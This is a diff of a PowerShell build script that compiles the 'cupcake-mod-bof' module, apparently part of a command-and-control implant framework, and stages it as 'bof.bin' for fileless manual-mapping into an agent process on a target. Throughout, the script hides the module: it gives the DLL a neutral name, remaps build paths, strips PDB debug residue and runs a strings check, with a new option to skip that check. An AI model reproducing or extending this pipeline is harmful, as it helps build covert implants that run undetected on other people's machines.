@@ -1,54 +1,53 @@
-# Build L2 classic BOF module (in-process COFF runner) -> storage/modules/bof.bin
+# Build L2 classic BOF module (Manual-Map PE) → storage/modules/bof.bin
 #
-# Architecture v2: bof = cdylib mapped INTO the agent process via Manual-Map
-# (fileless, no new process). The blob registered here is CKMS-packed+signed
-# by the server on push.
+# Artifact: app_rt.dll (neutral export name; cupcake-mod-bof crate)
+# Post: pe-strip-debug.py + strings-gate.ps1
 #
-# Post-processing: strips the RSDS/PDB debug-directory residue that survives
-# `strip = "symbols"` on MSVC (see pe-strip-debug.py), then runs the strings gate.
-#
-# Usage:
-#   powershell -File scripts/build-bof-module.ps1
+# Usage: powershell -File scripts/build-bof-module.ps1
+param(
+    [switch]$SkipGate
+)
 
-$ErrorActionPreference = "Stop"
+$ErrorActionPreference = 'Stop'
 $ServerRoot = Split-Path -Parent $PSScriptRoot
 $RepoRoot   = Split-Path -Parent $ServerRoot
-$ClientRoot = Join-Path $RepoRoot "Client"
-$OutDir     = Join-Path $ServerRoot "storage\modules"
-$DllName    = "app_rt.dll"
-$StripPy    = Join-Path $PSScriptRoot "pe-strip-debug.py"
-$Gate       = Join-Path $ClientRoot "scripts\strings-gate.ps1"
+$ClientRoot = Join-Path $RepoRoot 'Client'
+$OutDir     = Join-Path $ServerRoot 'storage\modules'
+$Pkg        = 'cupcake-mod-bof'
+$SrcName    = 'app_rt.dll'
+$DstName    = 'bof.bin'
+$StripPy    = Join-Path $PSScriptRoot 'pe-strip-debug.py'
+$Gate       = Join-Path $ClientRoot 'scripts\strings-gate.ps1'
 
-if (-not (Test-Path $ClientRoot)) {
-    throw "Client tree not found: $ClientRoot"
-}
+if (-not (Test-Path $ClientRoot)) { throw "Client tree not found: $ClientRoot" }
 
-Write-Host "[*] cargo build -p cupcake-mod-bof --release"
+Write-Host "[*] cargo build -p $Pkg --release"
 Push-Location $ClientRoot
 try {
-    cargo build -p cupcake-mod-bof --release
+    $env:RUSTFLAGS = "--remap-path-prefix `"$ClientRoot`"=."
+    cargo build -p $Pkg --release
     if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
 } finally {
     Pop-Location
 }
 
-$src = Join-Path $ClientRoot "target\release\$DllName"
-if (-not (Test-Path $src)) {
-    throw "built DLL not found: $src"
-}
+$src = Join-Path $ClientRoot "target\release\$SrcName"
+if (-not (Test-Path $src)) { throw "built DLL not found: $src" }
 
 New-Item -ItemType Directory -Force -Path $OutDir | Out-Null
-$dst = Join-Path $OutDir "bof.bin"
+$dst = Join-Path $OutDir $DstName
 Copy-Item -Force $src $dst
 
-Write-Host "[*] stripping PE debug directory (RSDS/PDB path residue)"
-python $StripPy $dst
-if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
+if (Test-Path $StripPy) {
+    Write-Host '[*] stripping PE debug directory (RSDS/PDB)'
+    python $StripPy $dst
+    if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
+}
 
 Write-Host "[+] Installed $dst ($((Get-Item $dst).Length) bytes)"
-Write-Host "    Push via Modules UI; bof maps into the agent process (no file on target)."
+Write-Host '    Manual-Map into agent (fileless); no temp DLL on target.'
 
-if (Test-Path $Gate) {
+if (-not $SkipGate -and (Test-Path $Gate)) {
     & $Gate -Path $dst
     if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
 }
